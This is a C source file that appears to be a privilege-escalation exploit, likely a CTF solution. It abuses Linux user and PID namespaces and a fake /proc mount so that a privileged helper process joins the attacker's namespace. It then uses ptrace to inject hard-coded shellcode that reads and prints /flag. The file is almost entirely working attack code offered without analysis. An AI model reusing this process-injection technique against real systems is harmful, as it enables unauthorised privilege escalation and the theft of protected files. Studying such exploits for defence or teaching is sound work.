#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <linux/limits.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>

#define ESCALATOR_PID 2

char shellcode[] = "\xeb\x34\x5f\x48\x31\xf6\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\xba\x20\x00\x00\x00"
                   "\x48\x31\xc0\x0f\x05\x48\x89\xc2\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00"
                   "\x00\x48\x31\xff\x0f\x05\xe8\xc7\xff\xff\xff\x2f\x66\x6c\x61\x67\x00";

void perror_wrapper(char *err)
{
    FILE *fp = fopen("/tmp/err.txt", "w");
    fwrite(err, strlen(err), 1, fp);
    fclose(fp);
}

int retrieve_self_pid_from_proc()
{
    char buf[256];
    readlink("/proc/self", buf, sizeof(buf) - 1);
    return atoi(buf);
}


int gain_sys_ptrace_cap()
{
    /* Create new user namespace to gain capabilities. Create new pid namespace. It will be governed by the new user 
    namespace and thus init process is able to SYS_PTRACE processes within it. */
    if (unshare(CLONE_NEWUSER | CLONE_NEWNS | CLONE_NEWPID | CLONE_NEWUTS | CLONE_NEWIPC | CLONE_NEWCGROUP) == -1)
    {
        perror_wrapper("[!] unshare failed");
        return -1;
    }

    return 0;
}

int make_run_elf_join_child_pid_namespace(int parent_pid, int child_pid)
{
    char path[PATH_MAX];
    char path2[PATH_MAX];

    mkdir("/tmp/oldproc", 0777);
    if (mount("/proc", "/tmp/oldproc", NULL, MS_BIND | MS_REC, NULL) == -1)
    {
        perror_wrapper("[!][child] mount failed");
        return -1;
    }

    mkdir("/tmp/newproc", 0777);
    if (mount("/tmp/newproc", "/proc", "proc", MS_BIND | MS_REC, NULL) == -1)
    {
        perror_wrapper("[!][child] mount failed");
        return -1;
    }

    sprintf(path, "/tmp/newproc/%d", parent_pid);
    mkdir(path, 0777);
    sprintf(path, "/tmp/newproc/%d/ns", parent_pid);
    mkdir(path, 0777);

    sprintf(path, "/tmp/newproc/%d/ns/pid", parent_pid);
    sprintf(path2, "/tmp/oldproc/%d/ns/pid", child_pid);
    if (symlink(path2, path) == -1)
    {
        perror_wrapper("[!][child] symlink failed");
        return -1;
    }

    /* Create fifo, so that process blocks when trying to change uts namespace. */
    sprintf(path, "/tmp/newproc/%d/ns/uts", parent_pid);
    if (mkfifo(path, 0777) == -1)
    {
        perror_wrapper("[!][child] mkfifo failed");
        return -1;
    }
}

void put_data(char *dst, char *src, size_t len, pid_t tracee)
{
    size_t i, mod;
    union u {
        int i;
        char chars[4];
    } u;

    for (i = 0; i < len; i += 4)
    {
        memcpy(u.chars, src + i, 4);
        if (ptrace(PTRACE_POKEDATA, tracee, dst + i, u.i))
        {
            perror("[!] ptrace failed");
            return;
        }
    }

    mod = i % 4;
    if (mod)
    {
        memcpy(u.chars, src + i + mod - 4, 4);
        if (ptrace(PTRACE_POKEDATA, tracee, dst + i + 4 - mod, u.i))
        {
            perror("[!] ptrace failed");
            return;
        }
    }
}

int takeover_escalator_process(pid_t escalator_pid)
{
    struct user_regs_struct regs;

    /* Wait for escalator process to join pid namespace. No need to win the race as a process will block on opening 
    the pipe. */
    while (ptrace(PTRACE_ATTACH, escalator_pid, NULL, NULL) == -1)
    {
        sleep(1);
    }

    waitpid(escalator_pid, NULL, 0);

    /* Retrieve rip to inject shellcode. */
    ptrace(PTRACE_GETREGS, escalator_pid, NULL, &regs);
    put_data((char*) regs.rip, shellcode, sizeof(shellcode), escalator_pid);
    ptrace(PTRACE_DETACH, escalator_pid, NULL, NULL);
}

int main()
{
    char path[PATH_MAX];
    printf("[i] pid: %d\n", getpid());

    if (gain_sys_ptrace_cap() == -1)
    {
        return -1;
    }

    pid_t child_pid;
    /* Parent process is already in nested pid namespace, so retrieve pid from /proc/self. */
    pid_t parent_pid = retrieve_self_pid_from_proc();

    switch (child_pid = fork())
    {
    case 0:
        /* Process sees self as process with id 1, but we can still retrieve the real value from /proc/self. */
        child_pid = retrieve_self_pid_from_proc();
        printf("[i][child] pid: %d\n", child_pid);

        if (make_run_elf_join_child_pid_namespace(parent_pid, child_pid) == -1)
        {
            return -1;
        }

        /* Wait for escalator process. */
        if (takeover_escalator_process(ESCALATOR_PID) == -1)
        {
            return -1;
        }

        /* Unblock escalator process. Not sure if needed. */
        sprintf(path, "/proc/%d/ns/uts", parent_pid);
        open(path, O_WRONLY);
        break;

    default:
        break;
    }

    while (1)
    {
        sleep(1);
    }

    return 0;
}